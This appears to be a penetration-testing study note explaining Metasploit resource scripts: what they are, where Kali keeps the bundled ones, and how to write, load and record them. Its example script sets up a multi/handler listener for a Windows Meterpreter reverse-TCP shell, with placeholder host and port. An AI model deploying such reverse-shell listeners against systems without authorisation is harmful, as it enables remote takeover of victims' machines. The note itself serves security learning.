
### Metasploit Resource Scripts

+ Metasploit resource scripts are a great feature of MSF that allow you to automate repetitive tasks and commands.

+ They operate similarly to batch scripts, whereby, you can specify a set of `Msfconsole` commands that you want to execute sequentially.

+ You can the load the script with `Msfconsole` and automate the execution of the commands you specified in the resource script.

+ We can use resource scripts to automate various tasks like setting up multi handlers as well as loading and executing payloads.

- We can check the resource scripts that come pre-packaged with Kali Linux. 
```
ls -la /usr/share/metasploit-framework/scripts/resource/
```

### How to create a resource script ?

1. In our case we'll be creating a resource script to automate the process of setting up a `multi/handler` to listen for incoming connections.

2. Create a `.rc` resource script using a text editor. `nano <script-name>.rc`

3. Write the command we want to run inside the resource script.
```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
run
```
- Its important to note that the commands inside the resource script should be written in the sequence we want them to run.

4. We can then load and execute the script.
```
msfconsole -r <script-name>.rc
```

5. We can also load up resource scripts from within the `msfconsole`
```
resource <path-to-script>
```

6. We can also create a resource script for the commands we ran. 
```
makerc /Downloads/portscan.rc
```

